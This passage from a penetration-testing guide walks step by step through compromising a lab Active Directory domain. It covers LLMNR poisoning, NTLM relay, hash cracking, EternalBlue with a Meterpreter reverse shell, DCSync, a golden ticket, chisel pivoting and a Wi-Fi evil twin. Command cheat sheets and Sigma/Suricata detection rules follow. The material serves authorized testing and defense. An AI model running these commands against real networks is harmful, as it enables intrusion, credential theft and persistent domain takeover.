│  └──────────┘               └───────────────┘                   │
│  ┌──────────┐               ┌───────────────┐                   │
│  │ WKS-03   │               │ WEB01         │                   │
│  │ Ubuntu   │               │ Ubuntu 22.04  │                   │
│  │ .1.102   │               │ .2.30         │                   │
│  └──────────┘               └───────────────┘                   │
│                              ┌───────────────┐                   │
│  VLAN 50 (Guest)            │ DB01          │                   │
│  ┌──────────┐               │ Ubuntu 22.04  │                   │
│  │ Attacker │               │ .2.40         │                   │
│  │ Kali     │               └───────────────┘                   │
│  │ .5.50    │                                                    │
│  └──────────┘               VLAN 30 (DMZ)                       │
│                              ┌───────────────┐                   │
│  Network Devices:           │ FW01          │                   │
│  - pfSense (Router/FW)      │ pfSense       │                   │
│  - Managed Switch (VLANs)   │ .3.1          │                   │
│  - WiFi AP (WPA2-Enterprise)└───────────────┘                   │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘

Subnet Assignments:
- 10.10.1.0/24  — VLAN 10 (Corporate Workstations)
- 10.10.2.0/24  — VLAN 20 (Servers)
- 10.10.3.0/24  — VLAN 30 (DMZ)
- 10.10.5.0/24  — VLAN 50 (Guest)
```

#### Deployment (Docker/VM-based)

```bash
# Option 1: Vagrant-based lab
# Vagrantfile defining all VMs with specific configurations

# Option 2: Proxmox/VMware deployment
# - DC01: Windows Server 2019, AD DS role, DNS
# - FS01: Windows Server 2019, file shares, SMB
# - WEB01: Ubuntu 22.04, Apache/nginx, vulnerable webapp
# - DB01: Ubuntu 22.04, MySQL 5.7, PostgreSQL
# - WKS-01/02: Windows 10 Pro, domain-joined
# - WKS-03: Ubuntu Desktop, LDAP-authenticated
# - FW01: pfSense 2.7, inter-VLAN routing

# Active Directory configuration:
# Domain: lab.local
# Users: j.smith (standard), t.admin (IT), svc-backup (service account with DA)
# GPO: LLMNR enabled, SMB signing not required, PowerShell logging minimal
# Shares: \\FS01\Public, \\FS01\Finance$, \\FS01\IT$

# Intentional vulnerabilities:
# - LLMNR/NBT-NS enabled (default Windows)
# - SMB signing not required
# - MS17-010 on FS01 (unpatched)
# - Weak passwords on service accounts
# - Guest VLAN can reach corporate (misconfigured ACL)
# - WPA2-Enterprise with PEAP (no cert pinning on clients)
```

### 10.2 Phase 1: Reconnaissance

```bash
# == PASSIVE RECON ==

# From guest VLAN, observe broadcast/multicast traffic
tcpdump -i eth0 -n not host 10.10.5.50

# Identify NetBIOS name resolution traffic
tcpdump -i eth0 -n udp port 5355    # LLMNR
tcpdump -i eth0 -n udp port 137     # NBT-NS

# == ACTIVE RECON ==

# Discover live hosts on reachable networks
nmap -sn -PE -PP -PS21,22,25,80,443,445,3389 10.10.1.0/24 \
     10.10.2.0/24 10.10.3.0/24 -oA lab_discovery

# Fast port scan on discovered hosts
nmap -sS --top-ports 1000 -T4 --min-rate 1000 \
     -iL discovered_hosts.txt -oA lab_topscan

# Deep scan on interesting hosts
nmap -sS -sV -sC -p- -T4 -oA lab_full_dc01 10.10.2.10
nmap -sS -sV -sC -p- -T4 -oA lab_full_fs01 10.10.2.20
nmap -sS -sV -sC -p- -T4 -oA lab_full_web01 10.10.2.30

# Identify domain controller
nmap -p 88,389,636,3268,3269 10.10.2.0/24

# Enumerate domain from DNS
nmap --script=dns-srv-enum --script-args dns-srv-enum.domain=lab.local 10.10.2.10

# Vulnerability scan
nmap --script=vuln -p 445 10.10.2.0/24 -oA lab_vuln
```

### 10.3 Phase 2: MITM and Credential Capture

```bash
# Start Responder to capture hashes
responder -I eth0 -dwv

# Simultaneously, run mitm6 for DHCPv6 poisoning
mitm6 -d lab.local -i eth0

# Relay captured authentication to targets
# Terminal 3:
ntlmrelayx.py -tf relay_targets.txt -smb2support -l loot/

# Wait for user authentication events (file share access, email open, etc.)
# Captured hash example:
# [SMB] NTLMv2-SSP Client   : 10.10.1.100
# [SMB] NTLMv2-SSP Username : LAB\j.smith
# [SMB] NTLMv2-SSP Hash     : j.smith::LAB:abc123...

# Crack captured hash
hashcat -m 5600 captured_hashes.txt \
        /usr/share/wordlists/rockyou.txt \
        -r /usr/share/hashcat/rules/best64.rule
```

### 10.4 Phase 3: Initial Exploitation

```bash
# Using cracked credentials for initial access
crackmapexec smb 10.10.1.100 -u j.smith -p 'CrackedPassword1'
# [+] lab.local\j.smith:CrackedPassword1 (Pwn3d!)

# Check for admin access on other hosts
crackmapexec smb 10.10.1.0/24 10.10.2.0/24 \
             -u j.smith -p 'CrackedPassword1'

# Check MS17-010 on file server
nmap --script=smb-vuln-ms17-010 -p 445 10.10.2.20
# VULNERABLE

# Exploit EternalBlue for SYSTEM shell
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.2.20
set LHOST 10.10.5.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
# [*] Meterpreter session 1 opened

# Alternatively, gain shell via WinRM with j.smith creds
evil-winrm -i 10.10.1.100 -u j.smith -p 'CrackedPassword1'
```

### 10.5 Phase 4: Post-Exploitation and Lateral Movement

```bash
# On compromised FS01 (SYSTEM via EternalBlue):
# Dump credentials
meterpreter > hashdump
meterpreter > load kiwi
meterpreter > creds_all

# Or using secretsdump remotely
secretsdump.py lab.local/j.smith:'CrackedPassword1'@10.10.2.20

# Extract service account credentials
# Found: svc-backup NTLM hash: aad3b...:5e8c3...

# Verify svc-backup has Domain Admin
crackmapexec smb 10.10.2.10 -u svc-backup -H '5e8c3...' --groups
# Member of: Domain Admins

# DCSync for full domain compromise
secretsdump.py -hashes ':5e8c3...' lab.local/svc-backup@10.10.2.10
# Dumping all NTLM hashes including krbtgt

# Create golden ticket for persistence
ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... \
            -domain lab.local administrator

# Access any resource as administrator
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass lab.local/administrator@DC01.lab.local
```

### 10.6 Phase 5: Pivoting to Isolated Segments

```bash
# From FS01, identify additional network interfaces
meterpreter > ipconfig
# Interface 2: 10.10.2.20 (Server VLAN)
# Interface 3: 172.16.0.20 (Management VLAN — not in original scope map!)

# Set up pivot through FS01
# Using chisel:
# On attacker:
chisel server --reverse --port 8080

# On FS01:
chisel.exe client 10.10.5.50:8080 R:1080:socks

# Scan management network through pivot
proxychains nmap -sT -Pn -p 22,23,80,443 172.16.0.0/24

# Discovered: 172.16.0.1 (pfSense management), 172.16.0.2 (switch management)
# Test default credentials on network devices
proxychains curl -k https://172.16.0.1
# pfSense default: admin:pfsense — if changed, try common passwords
```

### 10.7 Phase 6: Wireless Assessment

```bash
# Monitor mode
airmon-ng start wlan0

# Identify target AP
airodump-ng wlan0mon
# Found: LAB-Corporate, WPA2-Enterprise, BSSID: AA:BB:CC:DD:EE:FF

# Set up evil twin with hostapd-wpe
# Configure to match LAB-Corporate SSID and channel
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Deauth clients to force reconnection to evil twin
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Captured PEAP credentials from hostapd-wpe output:
# mschapv2: username:LAB\t.admin
# mschapv2: response:...

# Crack MSCHAPv2 (weak implementation)
# Convert to hashcat format and crack
```

### 10.8 Phase 7: Reporting

#### Report Structure

```markdown
# Penetration Test Report — Lab Corporation

## Document Control
| Field | Value |
|-------|-------|
| Client | Lab Corporation |
| Assessment Type | Internal Network Penetration Test |
| Date | 2025-03-15 to 2025-03-17 |
| Version | 1.0 |
| Classification | CONFIDENTIAL |
| Prepared By | [Testing Team] |

## Executive Summary

Lab Corporation's internal network was assessed over a three-day period.
The assessment resulted in COMPLETE DOMAIN COMPROMISE within 4 hours of
initial network access, starting from a guest VLAN position with no
pre-existing credentials.

**Overall Risk Rating: CRITICAL**

Key findings:
1. Insufficient network segmentation allows guest VLAN to reach corporate resources
2. LLMNR/NBT-NS poisoning enables credential interception without authentication
3. Unpatched critical vulnerability (MS17-010) on file server provides SYSTEM access
4. Overprivileged service account (svc-backup) with Domain Admin rights
5. WPA2-Enterprise clients do not validate server certificates

## Attack Narrative
[Full narrative as demonstrated in phases above]

## Findings

### F-001: Network Segmentation Failure (CRITICAL — CVSS 9.1)
### F-002: LLMNR/NBT-NS Enabled (HIGH — CVSS 7.5)
### F-003: MS17-010 / EternalBlue (CRITICAL — CVSS 9.8)
### F-004: Overprivileged Service Account (CRITICAL — CVSS 9.0)
### F-005: WPA-Enterprise Certificate Validation Missing (HIGH — CVSS 7.4)
### F-006: SMB Signing Not Required (MEDIUM — CVSS 5.9)
### F-007: Weak Password Policy (MEDIUM — CVSS 5.3)
### F-008: Default Credentials on Network Devices (HIGH — CVSS 8.1)

## Remediation Roadmap
[Prioritized phases as shown in Section 9.4]

## Appendix A: Tools Used
## Appendix B: Full Scan Results
## Appendix C: Raw Evidence
## Appendix D: Methodology References (PTES, OSSTMM)
```

### 10.9 Engagement Checklist

```markdown
## Pre-Engagement
- [ ] SOW signed
- [ ] ROE agreed
- [ ] Emergency contacts exchanged
- [ ] VPN/network access provisioned
- [ ] Testing window confirmed
- [ ] Insurance verified

## Reconnaissance
- [ ] Passive OSINT complete
- [ ] Network topology mapped
- [ ] Live hosts identified
- [ ] Services enumerated
- [ ] Vulnerabilities identified
- [ ] Attack plan documented

## Exploitation
- [ ] Initial access achieved
- [ ] Credentials captured/cracked
- [ ] Privilege escalation demonstrated
- [ ] Lateral movement performed
- [ ] Domain compromise achieved (if applicable)
- [ ] Evidence collected for all findings

## Post-Exploitation
- [ ] Persistence mechanisms documented (not left active)
- [ ] Pivoting to isolated segments attempted
- [ ] Data access demonstrated
- [ ] Business impact quantified
- [ ] All implants/tools removed

## Reporting
- [ ] Executive summary written
- [ ] Attack narrative complete
- [ ] All findings documented with evidence
- [ ] CVSS scores calculated
- [ ] Remediation roadmap created
- [ ] Report peer-reviewed
- [ ] Knowledge transfer session scheduled

## Cleanup
- [ ] All tools removed from target systems
- [ ] All accounts created during test disabled/removed
- [ ] All persistence mechanisms removed
- [ ] All firewall rules reverted
- [ ] Client notified of engagement completion
- [ ] Test data securely destroyed per contract
```

### 10.10 Professional Report Presentation

When presenting findings to stakeholders:

**For executive audience:**
- Lead with business risk, not technical detail
- Use analogies: "This is equivalent to leaving the master key under the doormat"
- Quantify potential financial impact where possible
- Show the attack path as a simple diagram (no command output)
- Present remediation as investment with ROI

**For technical audience:**
- Walk through the attack narrative step by step
- Show exact commands and outputs (redacted where necessary)
- Demonstrate exploitation live in lab if possible
- Provide detection queries they can implement immediately
- Discuss tool-specific configurations for remediation

**For both:**
- Present findings in order of business impact, not chronological discovery
- Always pair problems with solutions
- Acknowledge good security controls observed
- Set realistic timelines and acknowledge resource constraints
- Offer to support remediation validation (retesting)

---

## Appendix A: Quick Reference Command Sheets

### Nmap Cheat Sheet

```bash
# Discovery
nmap -sn 192.168.1.0/24                    # Ping sweep
nmap -Pn 192.168.1.1                       # Skip discovery (treat all as up)
nmap -PS22,80,443 192.168.1.1              # TCP SYN discovery

# Port Scanning
nmap -sS -p- target                        # Full TCP SYN scan
nmap -sU --top-ports 100 target            # Top 100 UDP ports
nmap -sS -sU -p T:1-65535,U:53,161 target # Combined scan

# Service/Version
nmap -sV target                            # Version detection
nmap -sV --version-intensity 9 target      # Aggressive version
nmap -A target                             # OS + Version + Script + Traceroute

# NSE Categories
nmap --script=auth target                  # Authentication checks
nmap --script=brute target                 # Brute force attacks
nmap --script=vuln target                  # Vulnerability checks
nmap --script=discovery target             # Information gathering
nmap --script=exploit target               # Active exploitation
```

### Metasploit Quick Reference

```bash
# Core workflow
msfconsole
search type:exploit platform:windows smb
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS target
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker
exploit

# Post-exploitation modules
use post/windows/gather/hashdump
use post/multi/recon/local_exploit_suggester
use post/windows/gather/credentials/credential_collector
use post/multi/manage/autoroute

# Pivoting
run autoroute -s 10.10.2.0/24
use auxiliary/server/socks_proxy
set SRVPORT 1080
run
```

### Impacket Suite Reference

```bash
# Execution
psexec.py domain/user:pass@target
wmiexec.py domain/user:pass@target
smbexec.py domain/user:pass@target
atexec.py domain/user:pass@target "command"
dcomexec.py domain/user:pass@target

# Credential dumping
secretsdump.py domain/user:pass@target
secretsdump.py -hashes :ntlm domain/user@target

# Kerberos
GetNPUsers.py domain/ -usersfile users.txt -no-pass  # ASREPRoast
GetUserSPNs.py domain/user:pass -request              # Kerberoast
ticketer.py -nthash <krbtgt_hash> -domain-sid <SID> -domain <domain> <user>

# SMB
smbclient.py domain/user:pass@target
lookupsid.py domain/user:pass@target
reg.py domain/user:pass@target query -keyName HKLM\\SOFTWARE
```

### Responder Configuration Reference

```ini
# /etc/responder/Responder.conf
[Responder Core]
; Servers to start
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
DCERPC = On
WinRM = On
ProxyAuth = On

; Custom challenge for SMB
Challenge = Random

; Set to On for WPAD rogue proxy
WPAD = On
ProxyAuth = On

; Log file locations
SessionLog = /usr/share/responder/logs/Session.log
PoisonersLog = /usr/share/responder/logs/Poisoners.log
AnalyzeLog = /usr/share/responder/logs/Analyze.log
```

---

## Appendix B: Legal and Ethical Considerations

### Applicable Laws (Non-Exhaustive)

- **US:** Computer Fraud and Abuse Act (CFAA), state computer crime laws
- **EU:** Computer Misuse Directive 2013/40/EU, national implementations
- **UK:** Computer Misuse Act 1990 (as amended)
- **GDPR:** If personal data is accessed during testing, data protection applies
- **PCI DSS:** Requirement 11.3 mandates annual pentesting for cardholder environments

### Ethical Boundaries

1. **Never exceed authorized scope** — Even if you discover adjacent targets
2. **Handle discovered data responsibly** — Encrypt, minimize collection, destroy per agreement
3. **Report critical findings immediately** — Active compromises, child exploitation material, imminent safety risks
4. **Do not leave backdoors** — Remove all persistence, tools, accounts created during testing
5. **Maintain confidentiality** — Client findings are never shared without explicit permission
6. **Professional conduct** — The goal is improving security, not humiliating defenders

### Certifications for Network Pentesters

| Certification | Focus | Level |
|--------------|-------|-------|
| OSCP | Practical exploitation | Intermediate |
| OSEP | Advanced evasion, pivoting | Advanced |
| GPEN | Network pentest methodology | Intermediate |
| GXPN | Advanced exploit development | Advanced |
| CRTP | Active Directory attacks | Intermediate |
| CRTE | Advanced AD exploitation | Advanced |
| eCPPT | Practical network/webapp pentesting | Intermediate |
| PNPT | Practical network pentesting | Entry-Advanced |

---

## Appendix C: Detection and Defense Integration

### Network Detection Engineering for Common Pentest Techniques

```yaml
# Sigma Rule: Responder LLMNR/NBT-NS Poisoning
title: LLMNR/NBT-NS Poisoning Response Detected
status: experimental
logsource:
    category: network_connection
    product: zeek
detection:
    selection:
        dst_port:
            - 5355
            - 137
        response: true
    filter:
        src_ip|contains:
            - 'known_dns_servers'
    condition: selection and not filter
level: high

---
# Sigma Rule: Kerberoasting
title: Kerberos Service Ticket Request with RC4 Encryption
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4769
        TicketEncryptionType: '0x17'  # RC4
    filter:
        ServiceName|endswith: '$'  # Machine accounts use RC4 legitimately
    condition: selection and not filter
    timeframe: 1m
    condition_count: '>= 5'
level: high

---
# Suricata Rule: EternalBlue Detection
alert smb any any -> $HOME_NET 445 (
    msg:"ET EXPLOIT Possible ETERNALBLUE MS17-010";
    flow:to_server,established;
    content:"|ff|SMB|72|";
    content:"|fe 53 4d 42|";
    sid:2024897; rev:1;
)
```

### Network Segmentation Validation Checklist

```markdown
Post-pentest segmentation improvements should be validated:

- [ ] Guest VLAN cannot reach corporate VLAN (Layer 3 ACL)
- [ ] Workstation VLAN cannot reach server management ports
- [ ] Server-to-server communication restricted to required flows only
- [ ] Domain controller access limited to management VLAN
- [ ] Internet egress filtered (no direct outbound from servers)
- [ ] Lateral movement between workstations blocked (host firewall)
- [ ] Management interfaces on dedicated out-of-band VLAN
- [ ] Jump server required for administrative access
- [ ] Network flow logging enabled at all chokepoints
- [ ] Micro-segmentation rules enforced (if zero-trust deployed)
```

---

## Appendix D: Tool Installation and Environment Setup

### Kali Linux Pentest Toolset Verification

```bash
# Verify core tools are current
apt update && apt upgrade -y

# Essential tools check
which nmap masscan responder crackmapexec evil-winrm impacket-scripts \
      chisel ligolo-ng hashcat john aircrack-ng bettercap

# Install if missing
apt install -y nmap masscan responder crackmapexec evil-winrm \
               python3-impacket chisel hashcat john aircrack-ng bettercap

# Verify Impacket scripts
ls /usr/share/doc/python3-impacket/examples/
# secretsdump.py, psexec.py, wmiexec.py, ntlmrelayx.py, etc.

# Install additional tools not in repos
# Ligolo-ng
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-proxy_linux_amd64.tar.gz
tar xf ligolo-proxy_linux_amd64.tar.gz

# Kerbrute
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64

# BloodHound
apt install -y bloodhound neo4j
# Configure neo4j: neo4j console, change default password
```

### Operational Security for Pentesters

```bash
# Encrypt all pentest data at rest
cryptsetup luksFormat /dev/sdX
cryptsetup open /dev/sdX pentest_volume
mkfs.ext4 /dev/mapper/pentest_volume
mount /dev/mapper/pentest_volume /mnt/pentest

# Use encrypted communications for C2
# Generate TLS certificates for reverse shells
openssl req -x509 -nodes -days 365 -newkey rsa:4096 \
        -keyout server.key -out server.crt
cat server.key server.crt > server.pem

# VPN for all testing traffic (if remote)
# WireGuard tunnel to testing infrastructure

# Logging all commands (for evidence/timeline)
script -a pentest_session_$(date +%Y%m%d_%H%M%S).log

# Timestamped activity log
echo "[$(date -u +%Y-%m-%dT%H:%M:%SZ)] Activity description" >> activity_log.txt
```

---

## Summary of Key Principles

1. **Methodology drives quality** — Follow PTES/OSSTMM systematically; ad-hoc testing misses findings.
2. **Authorization is non-negotiable** — Written authorization before any packet touches the wire.
3. **Passive before active** — Maximize intelligence gathering before alerting defenders.
4. **Document everything** — Timestamps, commands, outputs. Reproducibility equals credibility.
5. **Chain vulnerabilities** — Individual medium-risk findings can chain into critical impact.
6. **Think like the defender** — Provide actionable detection guidance with every finding.
7. **Business context matters** — A SQL injection on a test server is not the same as one on the payment system.
8. **Clean up completely** — Leave no tools, accounts, or persistence behind.
9. **Continuous improvement** — Each engagement teaches new techniques; maintain a personal playbook.
10. **Ethics first** — The mission is improving security posture, not proving superiority.
